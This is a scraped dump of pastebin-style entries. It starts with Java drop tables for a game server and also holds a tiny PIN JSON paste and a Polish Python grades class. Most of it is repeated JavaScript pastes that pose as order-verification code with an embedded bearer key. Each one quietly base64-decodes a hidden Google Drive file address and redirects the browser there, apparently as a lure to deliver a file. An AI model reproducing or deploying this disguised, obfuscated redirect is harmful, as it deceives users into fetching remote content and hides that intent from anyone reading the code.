	           // itemId, min, max 
	    			  {37007, 10, 20}, 
	    			  {40000, 1, 1}, 
	    			  {21580, 1, 1}, 
	    			  {21582, 1, 2}, 
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  100.00,
	        		  02.00,
	        		  02.00,
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Event Gift Box
	private void use59935(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {5990, 10, 20}, 
	    			  {59811, 1, 1}, 
	    			  {59812, 1, 1}, 
	    			  {67022, 1, 2}, 
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  02.00,
	        		  02.00,
	        		  02.00,
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Farm Gift Box
	private void use59936(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {22017, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {20520, 1, 1}, 
	    			  {20519, 1, 1},			   
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,			   
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }"
Saxe4rFF,Order.js,kammex,JavaScript,Sunday 13th of April 2025 02:21:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rQaLGrG1,Pin Dialog Prime Video,Rakibmunshi721,JSON,Sunday 13th of April 2025 02:16:06 AM CDT,"{
  ""ModsLabs_Password"": [
    {
      ""password"": ""1234""
    }
  ]
}"
EGrFzL4h,Market.js,kammex,JavaScript,Sunday 13th of April 2025 02:05:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92653/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M1b6qXS6,Untitled,kammex,JavaScript,Sunday 13th of April 2025 01:50:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33491/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZwPJr2Q4,Untitled,adrianwii,Python,Sunday 13th of April 2025 01:46:36 AM CDT,"class Uczen:
    def __init__(self, name):
        self.name = name
        self.oceny = []

    def dodaj_ocene(self, ocena):
        self.oceny.append(ocena)

    def policz_srednia(self):
        suma = 0
        for ocena in self.oceny:
            suma += ocena

        return suma/len(self.oceny)


from uczen import Uczen

uczen = Uczen(""Adrian"")
print(uczen.name)


uczen.dodaj_ocene(5)
uczen.dodaj_ocene(1)
uczen.dodaj_ocene(3)

print(uczen.oceny)
print(uczen.policz_srednia())
"
qen1innh,Products.js,kammex,JavaScript,Sunday 13th of April 2025 01:35:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69511/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sVFweVic,Order.js,kammex,JavaScript,Sunday 13th of April 2025 01:19:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
07g382Ep,Market.js,kammex,JavaScript,Sunday 13th of April 2025 01:03:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61996/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
